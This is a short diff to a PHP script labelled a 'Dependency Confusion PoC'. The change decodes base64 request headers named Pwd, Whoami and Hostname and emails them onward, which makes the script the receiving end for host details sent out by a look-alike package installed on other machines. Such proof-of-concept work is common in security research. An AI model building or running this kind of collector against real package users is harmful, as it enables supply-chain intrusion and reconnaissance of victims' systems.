@@ -15,8 +15,18 @@ function getRequestHeaders() {
 $headers = getRequestHeaders();
 $msg = '';
 foreach ($headers as $header => $value) {
-    $msg = $msg."$header: $value <br />\n";
+    
+    $v = $value;
+    
+    if ($header == 'Pwd' || $header == 'Whoami' || $header == 'Hostname') {
+        $v = base64_decode($value);
+    }
+
+    $msg = $msg."$header: $v <br />\n";
 }
+
+// echo $msg;
+
 
 $emailHeaders = "From: no-reply@kaspat.com\r\n";
 $subject = "Dependency Confusion PoC";
